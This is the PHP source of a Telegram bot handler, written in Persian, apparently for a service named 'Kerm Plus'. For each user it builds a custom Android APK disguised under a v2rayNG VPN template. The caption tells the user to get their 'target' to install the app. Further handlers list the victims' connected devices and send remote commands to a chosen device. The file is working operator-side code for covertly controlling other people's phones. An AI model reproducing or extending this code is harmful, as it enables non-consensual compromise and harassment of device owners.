<?php

namespace App\Telegram\Handlers;

use App\Telegram\Keyboards\MobileKermRiziKeyboard;
use SergiX44\Nutgram\Nutgram;
use App\Services\ApkBuilderService;
use App\Services\KermAppService;
use SergiX44\Nutgram\Telegram\Types\Internal\InputFile;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;
use Illuminate\Support\Facades\Log;
use App\Models\User;

class MobileKermRiziHandler
{
    protected KermAppService $appService;
    protected ApkBuilderService $apkService;
    protected const ADMIN_ID = 691903008;

    public function __construct(KermAppService $appService, ApkBuilderService $apkService)
    {
        $this->appService = $appService;
        $this->apkService = $apkService;
    }

    public function start(Nutgram $bot): void
    {
        $user = User::where('telegram_id', $bot->userId())->first();
        $apiToken = $user?->api_token;

        if ($apiToken) {
            $keyboard = InlineKeyboardMarkup::make()->addRow(
                InlineKeyboardButton::make('📱 مشاهده دستگاه‌های من', callback_data: 'list_devices')
            );

            $bot->sendMessage(
                "✅ شما قبلاً اپلیکیشن اختصاصی خود را دریافت کرده‌اید.\n\nبرای مدیریت دستگاه‌های متصل، روی دکمه زیر کلیک کنید:",
                reply_markup: $keyboard
            );
            return;
        }

        $bot->sendMessage('در حال آماده‌سازی اپلیکیشن اختصاصی شما... این فرآیند ممکن است کمی طول بکشد. ⏳');

        try {
            $userResponse = $this->appService->registerOwner(
                $bot->userId(),
                $bot->user()->username,
                $bot->user()->first_name
            );

            $apiToken = $userResponse['data']['api_token'];

            User::where('telegram_id', $bot->userId())->update(['api_token' => $apiToken]);
            $bot->setUserData('api_token', $apiToken);

            $buildData = $this->apkService->generateApk((string) $bot->userId(), $apiToken);

            // if ($buildData['status'] === 'scanning') {
            //     $bot->sendMessage('✅ فایل ساخته شد و هم‌اکنون در حال اسکن امنیتی (VirusTotal) است. در حال دریافت فایل...');
            // }

            $apkPath = $this->apkService->downloadApkFromServer($buildData['download_url']);

            $keyboard = InlineKeyboardMarkup::make()->addRow(
                InlineKeyboardButton::make('📱 مشاهده دستگاه‌های من', callback_data: 'list_devices')
            );

            $bot->sendDocument(
                document: InputFile::make($apkPath, 'MyApp.apk'),
                caption: '<tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji> اپلیکیشن اختصاصیت توسط <b>کرم پلاس</b><b><tg-emoji emoji-id="5134654202894615343">🪱</tg-emoji></b> ساخته شد.

<tg-emoji emoji-id="4927405916145321741">🪱</tg-emoji> برای کرم ریزی روی تارگتتون ، باید این برنامه رو بدید نصب کنه

<b><tg-emoji emoji-id="5965107454088843648">📶</tg-emoji></b><b> قالب انتخاب شده : v2rayNGپ</b>
',
                reply_markup: $keyboard,
                parse_mode: 'HTML'
            );

            @unlink($apkPath);

        } catch (\Exception $e) {
            $bot->sendMessage('❌ متأسفانه در ساخت اپلیکیشن مشکلی پیش آمد.');

            Log::channel('daily')->error('خطا در ساخت APK تلگرام', [
                'user_id' => $bot->userId(),
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ]);
            report($e);

            $bot->sendMessage("Error for user {$bot->userId()}:\n" . $e->getMessage(), self::ADMIN_ID);
        }
    }

    public function listDevices(Nutgram $bot): void
    {
        $apiToken = User::where('telegram_id', $bot->userId())->value('api_token') ?: $bot->getUserData('api_token');

        if (!$apiToken) {
            $bot->answerCallbackQuery('نشست شما منقضی شده. لطفاً دوباره /start را ارسال کنید.', true);
            return;
        }

        try {
            $response = $this->appService->getDevices($apiToken);
            $devices = $response['data'] ?? [];

            if (empty($devices)) {
                $bot->answerCallbackQuery('هنوز دستگاهی متصل نشده است. ابتدا اپلیکیشن را نصب و باز کنید.', true);
                return;
            }

            $keyboard = InlineKeyboardMarkup::make();

            foreach ($devices as $device) {
                $deviceInfo = trim(($device['manufacturer'] ?? '') . ' ' . ($device['model'] ?? ''));
                $deviceName = $deviceInfo ?: "دستگاه {$device['id']}";

                $keyboard->addRow(
                    InlineKeyboardButton::make($deviceName, callback_data: "dev_opts:{$device['id']}", icon_custom_emoji_id: "5407025283456835913")
                );
            }

            $bot->editMessageText('🪱 موبایلی که میخوای روش کرم بریزیم رو انتخاب کن:', reply_markup: $keyboard);
        } catch (\Exception $e) {
            $bot->answerCallbackQuery('❌ خطا در دریافت لیست دستگاه‌ها.', true);
            Log::error('Error fetching devices', ['exception' => $e]);
        }
    }

    public function showDeviceOptions(Nutgram $bot, $id): void
    {
        $bot->setUserData('selected_device_id', $id);
        $bot->editMessageText("⚙️ تنظیمات برای دستگاه #{$id}\n\nچه عملیاتی می‌خواهید انجام دهید؟", reply_markup: MobileKermRiziKeyboard::make());
    }

    public function executeCommand(Nutgram $bot, $event): void
    {
        $apiToken = User::where('telegram_id', $bot->userId())->value('api_token') ?: $bot->getUserData('api_token');

        if (!$apiToken) {
            $bot->answerCallbackQuery(text: 'نشست شما منقضی شده. لطفاً دوباره ربات را استارت کنید.', show_alert: true);
            return;
        }

        if (!in_array($bot->userId(), [self::ADMIN_ID, 500515501])) {
            $bot->answerCallbackQuery(text: 'درحال دیپلوی - دسترسی محدود است.', show_alert: true);
            return;
        }

        $id = $bot->getUserData('selected_device_id');

        if (!$id) {
            $bot->answerCallbackQuery(text: 'هیچ دستگاهی انتخاب نشده است. لطفا برگردید و دوباره انتخاب کنید.', show_alert: true);
            return;
        }

        try {
            $response = $this->appService->sendEvent($apiToken, $event, null, $id);
            $bot->answerCallbackQuery(text: 'درخواست کرم ریزی🪱 با موفقیت ثبت شد✅', show_alert: true);
        } catch (\Exception $e) {
            $bot->answerCallbackQuery(text: '❌ خطا در ارسال دستور. دستگاه آفلاین است یا سرور پاسخ نمی‌دهد.', show_alert: true);
            Log::error('Error sending command', ['event' => $event, 'device_id' => $id, 'error' => $e->getMessage()]);
        }
    }

    public function __invoke(Nutgram $bot): void
    {
        $msg = "<tg-emoji emoji-id='4929619512224909015'>🪱</tg-emoji> <b>کرم پلاس</b> <tg-emoji emoji-id='4929619512224909015'>🪱</tg-emoji>\n\nبه بخش کرم ریزی رو موبایل <tg-emoji emoji-id='5407025283456835913'>📱</tg-emoji> خوش اومدی ✋🏻\nبرای ادامه یکی از گزینه های زیر رو انتخاب کن :";

        $bot->editMessageText($msg, parse_mode: 'HTML', reply_markup: MobileKermRiziKeyboard::make());
    }
}
